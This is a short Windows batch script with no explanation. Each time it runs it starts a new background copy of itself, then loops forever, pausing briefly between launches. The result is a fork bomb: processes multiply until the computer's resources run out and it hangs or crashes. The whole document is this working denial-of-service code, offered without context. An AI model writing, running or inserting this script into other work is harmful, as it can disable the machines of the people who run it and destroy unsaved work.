batch
@echo off
setlocal enabledelayedexpansion
:start
start /b cmd /c "%~fx0"
ping -n 2 localhost >nul
goto start